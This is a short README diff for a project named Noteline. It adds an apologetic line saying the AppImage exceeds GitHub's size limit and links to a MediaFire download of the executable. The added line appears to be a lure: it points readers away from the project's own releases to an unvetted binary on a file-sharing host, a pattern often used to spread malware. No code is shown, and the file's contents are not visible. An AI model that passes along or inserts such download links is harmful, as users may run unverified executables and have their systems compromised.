@@ -1,4 +1,6 @@
+sorry for issue - appimage is 29mb which is exceding github limit so here's the link: https://www.mediafire.com/file/iuty76nul69ijml/noteline.appimage/file
 
+---
 
 # Noteline
 
